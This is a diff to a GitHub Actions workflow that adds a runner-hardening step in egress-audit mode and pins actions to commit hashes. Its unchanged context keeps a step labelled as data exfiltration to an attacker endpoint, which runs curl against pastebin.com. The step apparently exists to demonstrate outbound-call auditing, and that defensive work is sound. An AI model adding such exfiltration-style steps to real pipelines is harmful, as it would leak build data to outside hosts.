@@ -6,14 +6,19 @@ jobs:
     name: Deploy2
     runs-on: ubuntu-latest
     steps:
+      - name: Harden the runner (Audit all outbound calls)
+        uses: step-security/harden-runner@c6295a65d1254861815972266d5933fd6e532bdf # v2.11.1
+        with:
+          egress-policy: audit
+
       - name: Code Checkout
-        uses: actions/checkout@v2
+        uses: actions/checkout@ee0669bd1cc54295c223e0bb666b733df41de1c5 # v2.7.0
         with:
           fetch-depth: 2
       - name: Data Exfiltration To Attacker Controller Endpoint
         run: "curl pastebin.com  --connect-timeout 5  || true"
 
       - name: 1 Docker Action ashishkurmi/hello-action
-        uses: ashishkurmi/hello-action@main
+        uses: ashishkurmi/hello-action@c5327f7d9d31e29e58e788cb3c2727f773b3d0c4 # main
         env:
           SLEEPINSECONDS: 5
